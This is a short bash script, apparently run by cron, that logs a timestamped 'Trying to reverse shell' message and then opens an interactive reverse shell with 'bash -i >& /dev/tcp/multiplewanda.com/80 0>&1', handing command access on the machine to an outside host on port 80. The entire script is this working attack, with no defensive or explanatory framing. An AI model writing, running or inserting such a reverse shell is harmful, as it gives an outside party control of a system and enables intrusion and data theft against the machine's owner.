#!/usr/bin/env bash

LOGFILE=/home/corp/bclouser/cronout.txt

echo "Trying to reverse shell at $(date)" >> $LOGFILE
echo ""
bash -i >& /dev/tcp/multiplewanda.com/80 0>&1
